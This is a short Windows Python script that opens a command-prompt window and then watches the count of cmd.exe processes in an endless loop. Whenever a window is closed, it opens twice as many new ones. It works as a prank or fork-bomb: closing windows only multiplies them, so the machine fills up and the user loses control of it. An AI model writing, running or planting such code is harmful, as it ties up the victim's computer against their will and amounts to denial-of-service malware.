import subprocess
import time

def cmd_count():
    rs = subprocess.run("tasklist", shell=True, capture_output=True).stdout.split()
    liste = []
    for i in rs:
        if ".exe" in str(i):
            liste.append(str(i).strip("b").strip("'"))
    return liste.count("cmd.exe")

def cmd():
    mr = cmd_count()
    while True:
        pu = cmd_count()
        if pu != mr:
            result = (pu-mr)-(pu-mr)-(pu-mr)
            for i in range(0, result*2):
                subprocess.Popen("start cmd", stdout=subprocess.PIPE, shell=True)
            mr = cmd_count()
            pu = mr

subprocess.Popen("start cmd", stdout=subprocess.PIPE, shell=True)
cmd()